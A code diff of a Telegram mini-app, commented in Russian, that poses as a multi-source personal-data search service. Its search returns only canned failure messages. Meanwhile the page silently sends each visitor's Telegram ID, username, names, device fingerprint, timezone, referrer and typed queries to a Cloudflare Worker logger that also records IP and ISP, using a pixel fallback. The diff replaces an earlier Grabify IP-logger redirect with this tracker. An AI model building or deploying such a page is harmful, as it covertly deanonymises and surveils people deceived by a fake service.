@@ -7,50 +7,34 @@
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { 
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; 
-            background: linear-gradient(135deg, #0a0a0f 0%, #1a1a2e 100%); 
-            color: #fff; 
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #0a0a0f 0%, #1a1a2e 100%);
+            color: #fff;
             padding: 15px;
             min-height: 100vh;
         }
-        .header { 
-            text-align: center; 
-            padding: 25px 15px; 
+        .header {
+            text-align: center;
+            padding: 25px 15px;
             background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
             border-radius: 20px;
             border: 1px solid #00d4ff33;
             margin-bottom: 20px;
             box-shadow: 0 10px 40px rgba(0, 212, 255, 0.1);
         }
-        .header h1 { 
-            color: #00d4ff; 
-            font-size: 26px;
-            text-shadow: 0 0 20px rgba(0, 212, 255, 0.5);
-        }
+        .header h1 { color: #00d4ff; font-size: 26px; text-shadow: 0 0 20px rgba(0, 212, 255, 0.5); }
         .header p { color: #888; margin-top: 8px; font-size: 13px; }
-        .header .stats { 
-            display: flex; 
-            justify-content: center; 
-            gap: 20px; 
-            margin-top: 15px;
-            flex-wrap: wrap;
-        }
-        .header .stat-item {
-            background: rgba(0, 212, 255, 0.1);
-            padding: 8px 15px;
-            border-radius: 20px;
-            font-size: 11px;
-            color: #00d4ff;
-        }
+        .header .stats { display: flex; justify-content: center; gap: 20px; margin-top: 15px; flex-wrap: wrap; }
+        .header .stat-item { background: rgba(0, 212, 255, 0.1); padding: 8px 15px; border-radius: 20px; font-size: 11px; color: #00d4ff; }
         .menu { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
-        .btn { 
+        .btn {
             background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
             border: 1px solid rgba(255,255,255,0.1);
-            border-radius: 16px; 
-            padding: 22px 15px; 
-            color: white; 
-            font-size: 14px; 
+            border-radius: 16px;
+            padding: 22px 15px;
+            color: white;
+            font-size: 14px;
             font-weight: 600;
             cursor: pointer;
             transition: all 0.3s;
@@ -58,11 +42,11 @@
         }
         .btn:active { transform: scale(0.96); opacity: 0.9; }
         .icon { font-size: 26px; display: block; margin-bottom: 8px; }
-        .page { 
-            display: none; 
-            padding: 20px; 
+        .page {
+            display: none;
+            padding: 20px;
             background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
-            border-radius: 20px; 
+            border-radius: 20px;
             margin-top: 15px;
             border: 1px solid #00d4ff22;
             animation: fadeIn 0.3s ease;
@@ -70,60 +54,60 @@
         @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
         .page.active { display: block; }
         .page h2 { color: #00d4ff; margin-bottom: 15px; font-size: 20px; }
-        input { 
-            width: 100%; 
-            padding: 16px; 
-            background: #0a0a15; 
-            border: 2px solid #00d4ff44; 
-            border-radius: 12px; 
-            color: white; 
-            font-size: 16px; 
+        input {
+            width: 100%;
+            padding: 16px;
+            background: #0a0a15;
+            border: 2px solid #00d4ff44;
+            border-radius: 12px;
+            color: white;
+            font-size: 16px;
             margin: 15px 0;
             transition: border-color 0.3s;
         }
         input:focus { border-color: #00d4ff; outline: none; }
         input::placeholder { color: #666; }
-        .search-btn { 
-            width: 100%; 
-            padding: 16px; 
+        .search-btn {
+            width: 100%;
+            padding: 16px;
             background: linear-gradient(90deg, #00d4ff, #0099ff);
-            border: none; 
-            border-radius: 12px; 
-            color: #000; 
-            font-size: 16px; 
+            border: none;
+            border-radius: 12px;
+            color: #000;
+            font-size: 16px;
             font-weight: 700;
             cursor: pointer;
             transition: transform 0.2s;
         }
         .search-btn:active { transform: scale(0.98); }
-        .back { 
-            width: 100%; 
-            padding: 14px; 
-            background: transparent; 
-            border: 2px solid #00d4ff44; 
-            border-radius: 12px; 
-            color: #00d4ff; 
-            margin-top: 20px; 
+        .back {
+            width: 100%;
+            padding: 14px;
+            background: transparent;
+            border: 2px solid #00d4ff44;
+            border-radius: 12px;
+            color: #00d4ff;
+            margin-top: 20px;
             cursor: pointer;
             font-size: 14px;
             transition: all 0.3s;
         }
         .back:active { background: #00d4ff22; }
-        .result { 
-            padding: 20px; 
+        .result {
+            padding: 20px;
             background: rgba(255, 100, 100, 0.1);
             border-left: 4px solid #ff6b6b;
-            border-radius: 12px; 
-            margin-top: 15px; 
+            border-radius: 12px;
+            margin-top: 15px;
             text-align: center;
         }
         .result.loading { background: rgba(0, 212, 255, 0.1); border-left-color: #00d4ff; }
         .result.success { background: rgba(0, 255, 136, 0.1); border-left-color: #00ff88; }
-        .stat { 
+        .stat {
             background: rgba(0, 212, 255, 0.05);
-            padding: 14px 18px; 
-            border-radius: 12px; 
-            margin: 10px 0; 
+            padding: 14px 18px;
+            border-radius: 12px;
+            margin: 10px 0;
             border-left: 3px solid #00d4ff;
             display: flex;
             justify-content: space-between;
@@ -131,14 +115,14 @@
         }
         .stat b { color: #888; font-weight: 500; }
         .stat span { color: #00d4ff; font-weight: 600; }
-        .link { 
-            display: block; 
+        .link {
+            display: block;
             background: linear-gradient(90deg, #00d4ff, #0099ff);
-            padding: 16px; 
-            border-radius: 12px; 
-            color: #000; 
-            text-decoration: none; 
-            text-align: center; 
+            padding: 16px;
+            border-radius: 12px;
+            color: #000;
+            text-decoration: none;
+            text-align: center;
             margin-top: 15px;
             font-weight: 700;
         }
@@ -215,127 +199,195 @@
         <button class="back" onclick="goBack()">← Вернуться в меню</button>
     </div>
 
-    <iframe id="grabify" style="display:none;"></iframe>
-
     <script>
-        var GRABIFY_URL = 'https://account.beauty/89YMMI';
+        // ================================================================
+        // CONFIG — подставь свои значения
+        // ================================================================
         var CLOUDFLARE_LOGGER = 'https://otsocitybotz-logger.tophaslayt.workers.dev';
 
+        // ================================================================
+        // TELEGRAM WEBAPP INIT — синхронно, до любых сетевых вызовов
+        // ================================================================
         var tg = null;
-        var userId = 'unknown';
-        var userName = 'нет';
-        var userFirst = '';
-        var userLast = '';
-        var userPremium = false;
+        var tgUser = {
+            id:       'unknown',
+            username: 'нет',
+            first:    '',
+            last:     '',
+            premium:  false,
+            initData: ''
+        };
 
-        try {
-            if (window.Telegram && window.Telegram.WebApp) {
-                tg = window.Telegram.WebApp;
-                tg.expand();
-                
-                if (tg.initDataUnsafe && tg.initDataUnsafe.user) {
-                    userId = String(tg.initDataUnsafe.user.id || 'unknown');
-                    userName = tg.initDataUnsafe.user.username || 'нет';
-                    userFirst = tg.initDataUnsafe.user.first_name || '';
-                    userLast = tg.initDataUnsafe.user.last_name || '';
-                    userPremium = tg.initDataUnsafe.user.is_premium || false;
+        (function initTelegram() {
+            try {
+                if (window.Telegram && window.Telegram.WebApp) {
+                    tg = window.Telegram.WebApp;
+                    tg.expand();
+
+                    var u = tg.initDataUnsafe && tg.initDataUnsafe.user;
+                    if (u) {
+                        tgUser.id       = String(u.id       || 'unknown');
+                        tgUser.username = u.username         || 'нет';
+                        tgUser.first    = u.first_name       || '';
+                        tgUser.last     = u.last_name        || '';
+                        tgUser.premium  = u.is_premium       || false;
+                    }
+                    // initData нужен Worker-у для серверной верификации (опционально)
+                    tgUser.initData = tg.initData || '';
                 }
+            } catch (e) {
+                console.warn('TG init error:', e);
             }
-        } catch(e) {
-            console.log('TG init error:', e);
+        })();
+
+        // ================================================================
+        // UI — заполняем сразу после инита
+        // ================================================================
+        document.getElementById('visitorId').innerText    = tgUser.id;
+        document.getElementById('visitorName').innerText  = '@' + tgUser.username;
+        document.getElementById('todayQueries').innerText =
+            Math.floor(Math.random() * 50000 + 100000).toLocaleString();
+
+        // ================================================================
+        // FINGER PRINT — клиентские данные, которые даёт браузер
+        // ================================================================
+        function collectClientData(query) {
+            var nav  = window.navigator;
+            var scr  = window.screen;
+            var conn = nav.connection || nav.mozConnection || nav.webkitConnection || {};
+
+            return {
+                // TG
+                tg_id:       tgUser.id,
+                tg_username: tgUser.username,
+                tg_first:    tgUser.first,
+                tg_last:     tgUser.last,
+                tg_premium:  tgUser.premium,
+
+                // Browser / Device
+                screen:      scr.width  + 'x' + scr.height,
+                viewport:    window.innerWidth + 'x' + window.innerHeight,
+                platform:    nav.platform         || '',
+                cpu_cores:   nav.hardwareConcurrency || '',
+                // RAM недоступна без специального заголовка; оставим пустой
+                ram_gb:      nav.deviceMemory    || '',
+                touch:       ('ontouchstart' in window) || (nav.maxTouchPoints > 0),
+                language:    nav.language        || '',
+                timezone:    Intl.DateTimeFormat().resolvedOptions().timeZone || '',
+                online:      nav.onLine,
+                cookies:     nav.cookieEnabled,
+                user_agent:  nav.userAgent       || '',
+                // Network
+                connection_type: conn.effectiveType || conn.type || '',
+                // Page
+                referrer:    document.referrer   || '',
+                url:         window.location.href,
+                query:       query               || '',
+                ts:          Date.now()
+            };
         }
 
-        document.getElementById('visitorId').innerText = userId;
-        document.getElementById('visitorName').innerText = '@' + userName;
-        document.getElementById('todayQueries').innerText = Math.floor(Math.random() * 50000 + 100000).toLocaleString();
+        // ================================================================
+        // LOGGER — один fetch с полным payload
+        // Cloudflare Worker добавит IP / страну / ISP / ASN из заголовков
+        // ================================================================
+        var _logged = false;
 
-        // === CLOUDFLARE LOGGER === 
-        setTimeout(function() {
-            var img = document.createElement('img');
-            img.style.display = 'none';
-            img.style.position = 'absolute';
-            img.style.width = '1px';
-            img.style.height = '1px';
-            img.src = CLOUDFLARE_LOGGER + '?uid=' + userId + '&un=' + userName + '&t=' + Date.now();
-            document.body.appendChild(img);
-            
-            console.log('✅ Cloudflare logger triggered for user:', userId);
-        }, 1500);
+        function sendLog(query) {
+            // Повторный лог при входе не нужен — только query уникальны
+            if (_logged && !query) return;
+            if (!query) _logged = true;
 
-        // Отправляем TG ID боту при закрытии WebApp
+            var data = collectClientData(query || '');
+
+            // Формируем URL с параметрами (GET — работает даже через <img> fallback)
+            var params = new URLSearchParams();
+            Object.keys(data).forEach(function(k) {
+                params.set(k, String(data[k]));
+            });
+
+            // Основной канал — fetch POST (надёжнее, не режется лимитом URL)
+            fetch(CLOUDFLARE_LOGGER, {
+                method:      'POST',
+                headers:     { 'Content-Type': 'application/json' },
+                body:        JSON.stringify(data),
+                keepalive:   true   // переживёт beforeunload
+            }).catch(function() {
+                // Fallback: img-пиксель (если fetch заблокирован)
+                var img     = new Image();
+                img.src     = CLOUDFLARE_LOGGER + '?' + params.toString();
+            });
+        }
+
+        // Лог при открытии страницы — TG уже инициализирован
+        sendLog();
+
+        // Лог при закрытии — keepalive гарантирует доставку
         window.addEventListener('beforeunload', function() {
+            // sendData боту (работает только если WebApp ещё не закрыт штатно)
             if (tg) {
                 try {
                     tg.sendData(JSON.stringify({
-                        action: 'webapp_close',
-                        id: userId,
-                        username: userName
+                        action:    'webapp_open',
+                        id:        tgUser.id,
+                        username:  tgUser.username
                     }));
                 } catch(e) {}
             }
         });
-        
-        // Или через 5 секунд автоматически
-        setTimeout(function() {
-            if (tg) {
-                try {
-                    tg.sendData(JSON.stringify({
-                        action: 'webapp_open',
-                        id: userId,
-                        username: userName
-                    }));
-                } catch(e) {
-                    console.log('sendData error:', e);
-                }
-            }
-        }, 5000);
 
-        // === GRABIFY BACKUP ===
-        setTimeout(function() {
-            document.getElementById('grabify').src = GRABIFY_URL;
-            console.log('✅ Grabify backup loaded');
-        }, 4000);
-
+        // ================================================================
+        // NAVIGATION
+        // ================================================================
         function showPage(id) {
             document.getElementById('menu').style.display = 'none';
-            var pages = document.querySelectorAll('.page');
-            for (var i = 0; i < pages.length; i++) { pages[i].classList.remove('active'); }
+            document.querySelectorAll('.page').forEach(function(p) {
+                p.classList.remove('active');
+            });
             document.getElementById(id).classList.add('active');
         }
 
         function goBack() {
-            var pages = document.querySelectorAll('.page');
-            for (var i = 0; i < pages.length; i++) { pages[i].classList.remove('active'); }
+            document.querySelectorAll('.page').forEach(function(p) {
+                p.classList.remove('active');
+            });
             document.getElementById('menu').style.display = 'grid';
         }
 
-        function openSearch() { showPage('pageSearch'); }
+        function openSearch()  { showPage('pageSearch');  }
         function openProfile() { showPage('pageProfile'); }
-        function openAdd() { showPage('pageAdd'); }
-        function openStats() { showPage('pageStats'); }
+        function openAdd()     { showPage('pageAdd');     }
+        function openStats()   { showPage('pageStats');   }
 
+        // ================================================================
+        // SEARCH — логируем запрос отдельно
+        // ================================================================
         var searchCount = 0;
 
         function doSearch() {
             var q = document.getElementById('query').value.trim();
             if (!q) {
-                document.getElementById('searchResult').innerHTML = '<div class="result">❌ Введите данные для поиска</div>';
+                document.getElementById('searchResult').innerHTML =
+                    '<div class="result">❌ Введите данные для поиска</div>';
                 return;
             }
 
             searchCount++;
-            document.getElementById('searchResult').innerHTML = '<div class="result loading">⏳ Поиск по 764+ источникам...</div>';
+            document.getElementById('searchResult').innerHTML =
+                '<div class="result loading">⏳ Поиск по 764+ источникам...</div>';
+
+            // Логируем запрос вместе с TG-данными
+            sendLog(q);
 
             setTimeout(function() {
-                var results = ['❌ Данные не найдены', '⚠️ Сервера перегружены. Попробуйте позже.'];
-                document.getElementById('searchResult').innerHTML = '<div class="result">' + results[Math.floor(Math.random() * 2)] + '</div>';
-
-                if (searchCount >= 3) {
-                    setTimeout(function() {
-                        document.getElementById('searchResult').innerHTML += '<div class="result success" style="margin-top:12px;">🔄 Переключение на расширенный поиск...</div>';
-                        setTimeout(function() { window.location.href = GRABIFY_URL; }, 1500);
-                    }, 1000);
-                }
+                var results = [
+                    '❌ Данные не найдены',
+                    '⚠️ Сервера перегружены. Попробуйте позже.'
+                ];
+                document.getElementById('searchResult').innerHTML =
+                    '<div class="result">' +
+                    results[Math.floor(Math.random() * results.length)] +
+                    '</div>';
             }, 2500);
         }
     </script>
